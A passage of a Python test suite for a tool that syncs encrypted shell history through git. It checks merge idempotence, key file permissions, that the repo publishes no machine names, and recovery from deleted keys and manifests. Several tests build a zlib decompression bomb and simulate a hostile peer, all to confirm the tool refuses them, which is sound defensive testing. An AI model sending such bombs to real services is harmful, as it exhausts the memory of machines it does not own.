        The chunks are merged again, appended to a log that already holds them.
        Nothing can prevent that -- the record of what was merged is gone -- but
        it must be the *only* consequence, and it must not repeat.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before the upgrade")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(cache.load_entries()), 1)

            # Downgrade the state file to what the previous version wrote.
            state = store.load_json(store.state_file())
            state["merged"] = {key: sorted(names)[-1] for key, names in state["merged"].items()}
            store.save_json(store.state_file(), state)

            sync.run()
            after = len(cache.load_entries())
            sync.run()
            self.assertEqual(len(cache.load_entries()), after, "it re-merged a second time")

    def test_an_idle_sync_does_not_rewrite_the_state_file(self) -> None:
        """Recording every merged chunk name made this file about a megabyte.

        `run` saves at the end of every sync and the timer fires once a minute,
        so writing it out to say nothing happened is a lot of disk for no
        information -- and an idle sync is the overwhelmingly common one.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "something")
            sync.run(now=1_700_000_500)
            before = store.state_file().stat().st_mtime_ns

            sync.run(now=1_700_000_600)
            self.assertEqual(store.state_file().stat().st_mtime_ns, before)

            # And it still writes when there is something to say.
            alpha.record("2023-11-14", 1_700_000_002, "something else")
            sync.run(now=1_700_000_700)
            self.assertNotEqual(store.state_file().stat().st_mtime_ns, before)


class TestADecompressionBomb(SyncTestCase):
    """One machine must not decide how much memory the others spend.

    deflate reaches about 1030:1, so an unbounded decompress turned a 204 KB
    commit into 200 MiB of log and 420 MiB of RSS -- on a timer that fires every
    minute and asks nobody. Signing (#38) means the chunk has to come from a
    machine you accepted, which is why this is not a P0; it is still one
    compromised machine against every other one.
    """

    def test_a_bomb_is_refused_rather_than_expanded(self) -> None:
        bomb = zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 2), 9)
        self.assertLess(len(bomb), 1024 * 1024, "the fixture should be small to be a bomb")
        with self.assertRaises(zlib.error):
            sync.unpack(bomb)

    def test_the_boundary_is_where_it_says_it_is(self) -> None:
        """Exactly at the cap is legitimate; one byte past it is not.

        An off-by-one here either refuses a chunk a machine legitimately sent or
        leaves the last doubling unbounded, and neither shows up in a test that
        only tries a 200 MiB bomb.
        """
        limit = sync.MAX_CHUNK_BYTES
        self.assertEqual(len(sync.unpack(zlib.compress(b"x" * limit, 9))), limit)
        with self.assertRaises(zlib.error):
            sync.unpack(zlib.compress(b"x" * (limit + 1), 9))

    def test_the_refusal_costs_a_bounded_allocation(self) -> None:
        """`decompressobj` stops at the limit; `decompress` allocates first.

        Refusing *after* materialising the payload would leave the memory
        exhaustion in place and merely decline to write the file, so this
        measures what `sync.unpack` actually allocates rather than asserting a
        property of the standard library -- which is what it did first, and
        which passed perfectly well with the fix reverted.
        """
        bomb = zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 4), 9)
        tracemalloc.start()
        try:
            with self.assertRaises(zlib.error):
                sync.unpack(bomb)
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        # The bomb expands to four times the cap, so unbounded this peaks at
        # 256 MiB; bounded it peaks around 128 MiB -- the 64 MiB buffer plus the
        # doubling zlib does while filling it. Three times the cap sits in the
        # gap with room on both sides, which a tighter bound did not.
        self.assertLess(peak, sync.MAX_CHUNK_BYTES * 3)

    def test_a_bomb_in_a_real_chunk_is_reported_and_merges_nothing(self) -> None:
        """Through the whole path: it is refused like any other unusable chunk,
        the sync completes, and everything else still merges."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "an ordinary command")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()

            # A chunk alpha signs, holding a payload that unpacks far too big.
            day = "2023-11-14"
            pub = archive.day_key_public(alpha.id, day).read_text(encoding="utf-8").strip()
            sealed = crypto.encrypt_to(zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 2), 9), pub)
            path = archive.chunk_dir(alpha.id, day) / "1900000000-ffffff.age"
            path.write_bytes(sealed)
            listed = manifest.read(alpha.id, day, sync.signing_public())
            listed[path.name] = manifest.ManifestEntry(manifest.digest_of(sealed))
            manifest.write(store.machine(), day, listed)
            self.publish_repo_edit()

        with beta.active():
            report = sync.run()
            self.assertIn(f"{alpha.id}/{day}", report.subjects(sync.UNREADABLE))
            self.assertEqual(beta.commands(), {"an ordinary command"})
            log = store.log_file(alpha.id, day)
            self.assertLess(log.stat().st_size, 1024, "the bomb reached the log file")

    def test_a_real_import_sized_chunk_still_merges(self) -> None:
        """The cap has to sit above what a legitimate machine actually sends.

        A whole bash_history imported at once measures about 4.4 MiB, so this
        drives a chunk of that size through the real path.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(20_000):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i} " + "x" * 60)
            report = sync.run(now=1_700_000_500)
            self.assertEqual(report.lines_exported, 20_000)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            self.assertEqual(sync.run().lines_imported, 20_000)

    def test_a_hosts_plaintext_is_not_all_held_before_anything_is_written(self) -> None:
        """The other half of #20: peak memory grew with the chunks waiting.

        Observed through how often the day is written: below the threshold it is
        one write per day, as it always was; above it, the merge writes as it
        goes instead of holding everything until the loop ends.
        """
        _alpha, beta = self.history_across_days(days=2, per_day=6)

        original = sync._Day._write
        with (
            beta.active(),
            mock.patch.object(sync, "FLUSH_BYTES", 1),
            mock.patch.object(sync._Day, "_write", autospec=True, side_effect=original) as spy,
        ):
            sync.run()
            writes = spy.call_count
        self.assertGreater(writes, 2, "a whole host was held before anything was written")

    def test_flushing_part_way_through_loses_and_duplicates_nothing(self) -> None:
        """And what it writes is still exactly right.

        Driven with the threshold set absurdly low, so the flush fires between
        almost every chunk -- across days, and with a day that is being
        *rewritten* rather than appended to in the mix. That day must be exempt:
        a peer that already merged it and then flushed the compacted chunk early
        would append a copy of everything it already had.
        """
        alpha, beta = self.history_across_days(days=2, per_day=6)
        with beta.active():
            sync.run()
            before = len(cache.load_entries())

        with alpha.active():
            sync.compact(before="2023-11-15")
            sync.run(now=1_700_200_000)

        with beta.active(), mock.patch.object(sync, "FLUSH_BYTES", 1):
            sync.run()
            entries = cache.load_entries()

        self.assertEqual(len(entries), before, "a flush duplicated a rewritten day")
        self.assertEqual(len({e.cmd for e in entries}), before)


class TestCloningDoesNotShareObjectsWithTheOrigin(SyncTestCase):
    """Issue #79: `git clone` of a *local path* hardlinks objects from it.

    A bare repo on a NAS or a shared filesystem is an ordinary woswoar remote,
    and a fleet syncing to it means the source is being written while a joining
    machine clones. Git notices and refuses -- `fatal: hardlink different from
    source` -- which is how this surfaced, on CI, on a pull request that changed
    a version string.
    """

    def test_the_clone_shares_no_object_file_with_its_source(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            objects = list((store.history_dir() / ".git" / "objects").rglob("*"))
            files = [p for p in objects if p.is_file()]
            self.assertTrue(files, "precondition: the clone has object files")

            # A hardlink is the same inode as the origin's copy. Linked objects
            # mean a `git gc` or a corruption on either side reaches the other,
            # quite apart from the clone failing under a concurrent writer.
            origin_inodes = {p.stat().st_ino for p in Path(self.origin).rglob("*") if p.is_file()}
            shared = [p for p in files if p.stat().st_ino in origin_inodes]
            self.assertEqual(shared, [], "objects are hardlinked to the origin")

    def test_the_clone_reads_no_object_file_out_of_the_origin(self) -> None:
        """The stronger claim, and the one that keeps main green.

        Not sharing an inode is not enough. `--no-hardlinks` still walks the
        origin's `objects/` and copies whatever the directory listing named,
        and that listing is not a snapshot: a concurrent push migrating its
        quarantine, or a `gc --auto` the last push detached into the
        background, removes a loose object between the listing and the open.
        The clone then dies with `fatal: failed to copy file to ...`, which is
        how main went red at v0.3.0 -- and in the hardlink spelling it is #79
        itself, because a failed `link()` falls back to this same copy.

        `--no-local` asks `upload-pack` for a pack. So every object the origin
        holds *loose* has to arrive here *packed*: that is the difference
        between reading someone else's live object store and being sent one.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        def loose(objects: Path) -> set[str]:
            """Object ids stored as individual files, as `objects/ab/cdef...`."""
            return {p.parent.name + p.name for p in objects.glob("??/*") if p.is_file()}

        # Without this the test is vacuous: a fully packed origin has nothing
        # for the local path to copy, so both spellings would pass. A push
        # small enough for `transfer.unpackLimit` is exploded into loose
        # objects on arrival, which is every push woswoar makes.
        from_origin = loose(Path(self.origin) / "objects")
        self.assertTrue(from_origin, "precondition: the origin holds loose objects")

        beta = self.machine("beta")
        with beta.active():
            objects = store.history_dir() / ".git" / "objects"
            self.assertTrue(list((objects / "pack").glob("*.pack")), "the clone received no pack")
            # beta has committed its own enrolment by now, so it has loose
            # objects of its own -- they are simply not the origin's.
            copied = sorted(from_origin & loose(objects))
            self.assertEqual(copied, [], "the clone copied the origin's loose objects")

    def test_a_joining_machine_still_gets_the_history(self) -> None:
        """The copy has to be a real one, not merely an unlinked one."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        # Enrol first, then grant: `grant` seals to the recipients as they are
        # at that moment, so the other order widens access to a list beta is
        # not yet in.
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status"})


class TestInitLeavesNothingReadable(SyncTestCase):
    """The first thing a new machine does must not fail its own check.

    `woswoar install` walks these paths and re-tightens them, and `doctor`
    reports any that another account could read. But `init` can run first, and
    it creates the signing key -- so before this, the very first `doctor` on a
    fresh machine said `[FAIL] private` about a file woswoar had just written,
    with the user having done nothing wrong.
    """

    def test_a_stock_umask_cannot_loosen_what_init_writes(self) -> None:
        # 022 is the default nearly everywhere, and is what left the public half
        # 0644: ssh-keygen honours it. Pinned rather than inherited, so this
        # cannot pass vacuously on a strict runner.
        previous = os.umask(0o022)
        self.addCleanup(os.umask, previous)

        alpha = self.machine("alpha")
        with alpha.active():
            # The harness makes WOSWOAR_DIR with a plain mkdir, so it arrives
            # 0755. A real one is created by woswoar at 0700 -- and a directory
            # woswoar *found* is deliberately not re-permissioned, since a
            # user-chosen WOSWOAR_DIR is not its to clamp. Set it to what a real
            # install has, so what is asserted below is what woswoar wrote.
            store.data_dir().chmod(0o700)

            self.assertEqual(support.loose_paths(), [])
            # And the helper the code uses agrees, which is what `doctor` reads.
            self.assertEqual(store.readable_by_others(), [])

    def test_the_signing_key_is_owner_only_on_both_halves(self) -> None:
        """A public key exposes nothing; the guarantee is what it would break."""
        previous = os.umask(0o022)
        self.addCleanup(os.umask, previous)

        alpha = self.machine("alpha")
        with alpha.active():
            private = store.signing_key_file()
            for half in (private, crypto.public_half(private)):
                self.assertTrue(half.is_file(), half)
                self.assertEqual(half.stat().st_mode & 0o777, 0o600, f"{half} is loose")


class TestTheRepoExplainsItself(SyncTestCase):
    """A history repository is opaque by design, which makes it unreadable in
    the other sense too: a stranger who finds it, or its owner three years on,
    sees directories of random hex and encrypted blobs and no way to tell what
    it is or what touching it would break."""

    def test_init_commits_a_readme(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            committed = gitrepo.git("ls-files").splitlines()
            self.assertIn(archive.README, committed, "the README was not committed")
            text = (store.history_dir() / archive.README).read_text(encoding="utf-8")
        self.assertIn("github.com/martinus/woswoar", text, "no link to the project")
        self.assertIn("Do not edit", text)

    def test_a_peer_receives_it(self) -> None:
        """It is in the repo, so it arrives with the clone rather than per machine."""
        self.machine("alpha")
        beta = self.machine("beta")
        with beta.active():
            self.assertTrue((store.history_dir() / archive.README).is_file())

    def test_it_is_written_once_and_then_left_alone(self) -> None:
        """A machine on another version must not rewrite a peer's wording.

        `.gitattributes` *is* compared and rewritten, because `merge=union` on
        `recipients.txt` is what keeps two machines enrolling at once
        conflict-free. Prose earns no such thing: rewriting it would mean two
        versions putting it back at each other every time anyone ran `init`.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            readme = store.history_dir() / archive.README
            readme.write_text("written by another version\n", encoding="utf-8")
            gitrepo.commit()

            # `init` again is the path that could rewrite it -- `sync` never
            # touches repo metadata at all.
            sync.initialise(remote=str(self.origin))
            self.assertEqual(readme.read_text(encoding="utf-8"), "written by another version\n")


class TestRecipientsPublishNoNames(SyncTestCase):
    """#22: the one plaintext file in the repo named every machine.

    `docs/security.md` says host directories are opaque hex so that a leaked
    archive does not publish usernames and hostnames. `recipients.txt` undid
    that one file over -- with woswoar's own `$USER@$(uname -n)` label, and
    again with the SSH key's own comment, which ssh-keygen writes by default.
    """

    @requires_ssh_keygen
    def test_an_ssh_recipient_loses_its_comment(self) -> None:
        """The second half of #22, and the one that leaks without woswoar's help.

        An SSH public key ends in a free-text comment, conventionally
        `user@host`, and `ssh-keygen` puts it there by default. Publishing the
        key verbatim publishes that -- twice since signatures landed, because
        `signer.pub` names the owning recipient too.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = self.root / "with-a-comment"
            subprocess.run(
                [
                    "ssh-keygen",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-q",
                    "-C",
                    "martinus@secret-box",
                    "-f",
                    str(key),
                ],
                check=True,
                timeout=60,
            )
            recipient = crypto.recipient_for(key)
            self.assertNotIn("secret-box", recipient)
            # And it is still a recipient age will seal to.
            crypto.encrypt_to_recipients(b"payload", [recipient])

    @requires_ssh_keygen
    def test_a_file_written_before_the_comment_was_stripped_enrols_one_key(self) -> None:
        """The upgrade case, and the one a producer-side strip alone gets wrong.

        `recipients.txt` already holds the key with its comment. Normalising
        only what this machine *writes* leaves the old spelling live beside the
        new one: the same key enrolled twice, listed twice by `grant` under one
        fingerprint, and a tombstone matching only one of the two.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = self.root / "legacy_id_ed25519"
            subprocess.run(
                [
                    "ssh-keygen",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-q",
                    "-C",
                    "martinus@secret-box",
                    "-f",
                    str(key),
                ],
                check=True,
                timeout=60,
            )
            with_comment = key.with_suffix(".pub").read_text(encoding="utf-8").strip()
            archive.recipients_file().write_text(
                f"{with_comment}{sync._LABEL_SEP}martinus@box\n", encoding="utf-8"
            )

            machine = store.machine()._replace(identity=str(key))
            store.save_machine(machine)
            sync._write_repo_metadata(machine, key)

            enrolled = sync.recipients()
        self.assertEqual(len(enrolled), 1, "the same key was enrolled under two spellings")
        self.assertNotIn("secret-box", enrolled[0])

    def test_nothing_in_the_repo_names_the_machine(self) -> None:
        """The claim, checked across every committed byte rather than one file.

        `docs/security.md` says the repo does not publish machine names. This is
        what makes that a guarantee instead of a sentence.
        """
        # A user name that cannot occur in the repo for any other reason. The
        # earlier fixture used "martinus", which is also the owner of the
        # project URL in `archive.README_CONTENT` -- so this failed on a string
        # that names no machine, and would have kept failing for every user
        # whose account happens to match a word in a committed file.
        alpha = self.machine("alpha", display="zqoperator@secret-box")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            # Through `doctor --prove`'s scanner: it walks `.git` -- where git
            # would record an author identity, kept constant by
            # `gitrepo.ensure_config` -- and additionally inflates every object,
            # where a name in a *superseded* revision of `recipients.txt`
            # would hide from a raw walk and still be pushed. That rewritten
            # file is exactly how #22 leaked names in the first place.
            committed = b"".join(data for _, data in prove._published_bytes(store.history_dir()))
        self.assertNotIn(b"secret-box", committed)
        self.assertNotIn(b"zqoperator", committed)

        # And the one plaintext file a machine name could most easily creep
        # into is exactly what the constant says, so nothing can ever be
        # interpolated into it.
        with alpha.active():
            readme = (store.history_dir() / archive.README).read_text(encoding="utf-8")
        self.assertEqual(readme, archive.README_CONTENT)

    def test_no_name_is_written_into_recipients_at_all(self) -> None:
        """#22: the label used to be `$USER@$(uname -n)`, in cleartext.

        The host directories beside it are opaque hex precisely so a leaked
        archive does not name the machines, and this file undid that one line
        over. There is now nothing in it but keys.
        """
        alpha = self.machine("alpha", display="martinus@secret-box")
        with alpha.active():
            written = archive.recipients_file().read_text(encoding="utf-8")
        self.assertNotIn("secret-box", written)
        self.assertNotIn("martinus", written)
        self.assertNotIn(sync._LABEL_SEP, written)


class TestAnOrphanedDayKey(SyncTestCase):
    """Issue #42: a public day key whose sealed half has gone.

    `sync.orphaned_day_key` explains the state. What these pin is that it is
    reachable by a stranger rather than only by bad luck, and that reaching it
    costs the day's future history rather than passing unnoticed.
    """

    def test_a_peer_can_delete_another_machines_sealed_key(self) -> None:
        """The reachability the priority rests on, through a real bare repo."""
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)

        with beta.active():
            sync.run()
            victim = archive.day_key(alpha.id, "2023-11-14")
            self.assertTrue(victim.is_file(), "beta cannot even see the key; premise is wrong")
            victim.unlink()
            self.publish_repo_edit()

        with alpha.active():
            sync.run()
            self.assertFalse(archive.day_key(alpha.id, "2023-11-14").is_file())
            self.assertTrue(archive.day_key_public(alpha.id, "2023-11-14").is_file())

        # What was published before the deletion is still readable by a machine
        # that had already merged it. That is what makes "copy the key back from
        # another clone" real advice rather than wishful.
        with beta.active():
            sync.run()
            self.assertIn("ours", beta.commands())

    def test_nothing_more_is_written_for_a_day_whose_key_is_gone(self) -> None:
        """The bug: sync used to mint over the top and report success."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            before = {c.name for c in archive.iter_chunks(alpha.id)}

            archive.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")
            report = sync.run()

            self.assertEqual(report.chunks_written, 0)
            self.assertEqual(report.subjects(sync.ORPHANED), {"2023-11-14"})
            self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)

    def test_the_lines_stay_pending_rather_than_being_lost(self) -> None:
        """Refusing must not consume them: `logs/` is the only copy left."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            sealed = archive.day_key(alpha.id, "2023-11-14").read_bytes()
            archive.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")
            sync.run()

            # Put the sealed half back, which is what copying it from another
            # clone amounts to, and the pending line publishes on the next
            # ordinary sync.
            store.write_atomic(archive.day_key(alpha.id, "2023-11-14"), sealed)
            report = sync.run()
            self.assertEqual(report.subjects(sync.ORPHANED), set())
            self.assertGreater(report.chunks_written, 0)

    def test_a_day_with_no_chunks_yet_simply_mints_a_new_key(self) -> None:
        """Half-written pairs are ordinary; only chunks make them unrecoverable."""
        alpha = self.machine("alpha")
        with alpha.active():
            # A real key, not a malformed one: a bad recipient would make age
            # fail loudly and the test would pass for the wrong reason. This is
            # the silent case -- a usable public half whose secret is gone.
            stale = crypto.generate_identity()
            pub = archive.day_key_public(alpha.id, "2023-11-14")
            pub.parent.mkdir(parents=True, exist_ok=True)
            pub.write_text(stale.public + "\n", encoding="utf-8")

            alpha.record("2023-11-14", 1_700_000_001, "first")
            report = sync.run()

            self.assertEqual(report.subjects(sync.ORPHANED), set())
            self.assertEqual(report.chunks_written, 1)
            self.assertTrue(archive.day_key(alpha.id, "2023-11-14").is_file())
            self.assertNotEqual(
                pub.read_text(encoding="utf-8").strip(),
                stale.public,
                "the stale public half was reused, so the chunk is already lost",
            )

    def test_an_interrupted_mint_leaves_the_recoverable_half(self) -> None:
        """Ordering is the guarantee: sealed half first, public half second.

        Written the other way round, a crash between the two produces exactly
        the state this whole class is about, from woswoar's own hand rather than
        a stranger's. This way the crash window leaves a sealed key with no
        public half, which is simply re-minted.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first")
            real = store.write_atomic
            calls: list[Path] = []

            def die_after_first(path: Path, data: bytes) -> None:
                calls.append(path)
                if len(calls) > 1:
                    raise OSError("interrupted between the two writes")
                real(path, data)

            with (
                mock.patch.object(store, "write_atomic", die_after_first),
                self.assertRaises(OSError),
            ):
                sync.day_public_key(store.machine(), "2023-11-14")

            self.assertTrue(
                archive.day_key(alpha.id, "2023-11-14").is_file(), "sealed half missing"
            )
            self.assertFalse(archive.day_key_public(alpha.id, "2023-11-14").is_file())
            self.assertFalse(
                sync.orphaned_day_key(alpha.id, "2023-11-14"),
                "an interrupted mint produced the destructive state",
            )

    def test_sync_says_which_day_it_refused(self) -> None:
        """The refusal is only useful if the user is told. Through the CLI.

        `Report.orphaned` is an internal field; what `docs/security.md` claims
        is that woswoar *says so*, and only stderr proves that.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            archive.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")

        said = self.run_cli(alpha, "sync").err
        self.assertIn("2023-11-14", said)
        self.assertIn("cannot be published", said)
        # The recovery it offers has to be the one that works: the deleted key
        # is still a blob in git, because woswoar never rewrites history.
        self.assertIn("--diff-filter=D", said)

    def test_doctor_is_quiet_about_a_half_written_pair_with_no_chunks(self) -> None:
        """No chunks means nothing is lost, and the next sync mints over it.

        Reporting it would be a hard red for a state that heals itself, and the
        sentence doctor prints -- "chunks encrypted to them cannot be read" --
        would be false. `export` and `orphaned_days` have to agree on that, and
        they drifted apart once already.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()

            pub = archive.day_key_public(alpha.id, "2099-01-01")
            pub.parent.mkdir(parents=True, exist_ok=True)
            pub.write_text(crypto.generate_identity().public + "\n", encoding="utf-8")

            self.assertEqual(sync.orphaned_days(), [])
            _, text, _ = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] day keys", text)

    def test_compact_skips_the_day_rather_than_aborting(self) -> None:
        """One unreadable day used to leave every later day uncompacted."""
        alpha = self.machine("alpha")
        with alpha.active():
            for day in ("2023-11-14", "2023-11-15"):
                for i in range(2):
                    alpha.record(day, 1_700_000_001 + i, f"{day}-{i}")
                    sync.run()
            archive.day_key(alpha.id, "2023-11-14").unlink()

            days, replaced, _ = sync.compact(before="2023-12-01")

            self.assertEqual(days, 1, "the healthy day was not compacted")
            self.assertGreater(replaced, 0)
            self.assertGreater(
                len(list(archive.chunk_dir(alpha.id, "2023-11-14").iterdir())),
                1,
                "the unreadable day was touched",
            )

    def test_doctor_finds_it_before_more_chunks_pile_up(self) -> None:
        """Through the command, not the helper: the formatting is the fiddly part."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
            self.assertEqual(sync.orphaned_days(), [])
            code, healthy, _ = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] day keys", healthy)

            archive.day_key(alpha.id, "2023-11-14").unlink()
            self.assertEqual(sync.orphaned_days(), [(alpha.id, "2023-11-14")])

            code, text, _ = self.run_cli(alpha, "doctor")
            self.assertEqual(code, 1, "doctor stayed green with an unreadable day")
            self.assertIn("[FAIL] day keys", text)
            self.assertIn("2023-11-14", text)


class TestADeletedManifest(SyncTestCase):
    """Issue #63, the sibling of #42 in the other rewritable file.

    `manifest.read` returns nothing for "absent" and for "will not verify"
    alike, and only the second was guarded. So a deleted manifest looked exactly
    like a day never published: the fresh one signed at the end of `export`
    named only what that run wrote, and every chunk published earlier that day
    stopped being one any peer would accept.
    """

    def published_day(self) -> Fake:
        """One machine with one day published, which is all but one test needs.

        A peer costs an `ssh-keygen` and a clone, so the one test that needs one
        makes it itself rather than every test paying for it.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first")
            sync.run()
        return alpha

    def test_nothing_is_written_for_the_day(self) -> None:
        alpha = self.published_day()
        with alpha.active():
            path = archive.day_manifest(alpha.id, "2023-11-14")
            before = {c.name for c in archive.iter_chunks(alpha.id)}
            self.assertTrue(any(name in path.read_text(encoding="utf-8") for name in before))

            path.unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")
            report = sync.run()

            self.assertEqual(report.chunks_written, 0)
            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), {"2023-11-14"})
            self.assertEqual({c.name for c in archive.iter_chunks(alpha.id)}, before)
            # The disowning itself: a replacement would name only this run.
            self.assertFalse(path.exists(), "a replacement manifest was signed")

    def test_restoring_it_publishes_the_pending_line(self) -> None:
        """The lines stay in `logs/`, so the day is recoverable, not lost."""
        # Before alpha publishes, so beta is already a recipient when the day
        # key is minted -- otherwise it would need a `grant` as well, which is
        # a different mechanism and not what this test is about.
        beta = self.machine("beta")
        alpha = self.published_day()
        with alpha.active():
            path = archive.day_manifest(alpha.id, "2023-11-14")
            original = path.read_bytes()
            path.unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")
            sync.run()

            store.write_atomic(path, original)
            report = sync.run()
            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), set())
            self.assertEqual(report.chunks_written, 1)

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(sorted(beta.commands()), ["first", "second"])

    def test_a_day_never_published_here_is_not_refused(self) -> None:
        """A chunk under our id proves only that somebody wrote one.

        Keying on chunks rather than on this machine's own watermark would let
        anyone who can push plant one on a day we have not published and block
        that day for good.
        """
        alpha = self.published_day()
        with alpha.active():
            planted = archive.chunk_dir(alpha.id, "2023-11-20")
            planted.mkdir(parents=True, exist_ok=True)
            (planted / "9999999999-ffffff.age").write_bytes(b"whatever an attacker likes")

            alpha.record("2023-11-20", 1_700_500_000, "mine")
            report = sync.run()

            self.assertEqual(report.subjects(sync.MANIFEST_MISSING), set())
            self.assertEqual(report.chunks_written, 1)
            self.assertTrue(archive.day_manifest(alpha.id, "2023-11-20").exists())

    def test_sync_says_which_day_and_how_to_get_it_back(self) -> None:
        alpha = self.published_day()
        with alpha.active():
            archive.day_manifest(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")

        said = self.run_cli(alpha, "sync").err
        self.assertIn("2023-11-14", said)
        self.assertIn("--diff-filter=D", said)

    def test_doctor_is_quiet_when_every_published_day_has_its_manifest(self) -> None:
        """Keyed on what this machine published, not on log files on disk.

        A day recorded but never exported has no manifest either, and reporting
        it would be a hard red for the ordinary state of a day still being
        written. The watermark is what tells the two apart.
        """
        alpha = self.published_day()
        with alpha.active():
            alpha.record("2023-11-20", 1_700_500_000, "not yet published")
            self.assertEqual(sync.days_missing_a_manifest(), [])
            _, text, _ = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] manifests", text)

    def test_doctor_finds_a_quiet_day_sync_never_looks_at(self) -> None:
        """A day fully exported before the deletion never returns to `export`."""
        alpha = self.published_day()
        with alpha.active():
            _, healthy, _ = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] manifests", healthy)

            archive.day_manifest(alpha.id, "2023-11-14").unlink()
            self.assertEqual(sync.days_missing_a_manifest(), ["2023-11-14"])

            code, text, _ = self.run_cli(alpha, "doctor")
            self.assertEqual(code, 1)
            self.assertIn("[FAIL] manifests", text)
            self.assertIn("2023-11-14", text)


class TestASingleChunkStaysUnderTheReadersCap(SyncTestCase):
    """Issue #45: the reader's bound was never enforced on the writer.

    `unpack` refuses a chunk that decompresses past `MAX_CHUNK_BYTES`, but
    `read_tail` is bounded by "everything since the last export", not by size.
    A machine that imported a decade of history in one go could seal a chunk
    every peer then refused -- for good, because `state.exported` had already
    moved past those bytes and its own copy in `logs/` looked fine.
    """

    def test_a_tail_over_the_budget_becomes_several_chunks_none_too_big(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                report = sync.run()

            self.assertGreater(report.chunks_written, 1, "the tail was not split")
            self.assertEqual(report.lines_exported, 200)

            secret = sync.open_day_key(store.machine(), alpha.id, "2023-11-14")
            for chunk in archive.iter_chunks(alpha.id):
                plain = sync.unpack(crypto.decrypt_with_secret(chunk.path.read_bytes(), secret))
                self.assertLessEqual(len(plain), 512, f"{chunk.name} is over the budget")

    def test_a_peer_gets_every_line(self) -> None:
        """The point of the whole thing: nothing is lost by splitting."""
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                sync.run()

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 200)
            self.assertEqual(sorted(beta.commands()), sorted(alpha.commands()))

    def test_compaction_leaves_an_over_budget_day_alone(self) -> None:
        """The other producer, bound by the same budget.

        Merging a whole day unbounded would rebuild the very chunk the split
        prevents, and unlink the smaller ones that were fine. Skipped rather
        than merged in batches: partial compaction leaves some of a day's
        chunks unmerged, and a peer rebuilding a compacted day drops what it
        had already merged (#67).
        """
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(400):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
                if i % 40 == 39:
                    with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                        sync.run()

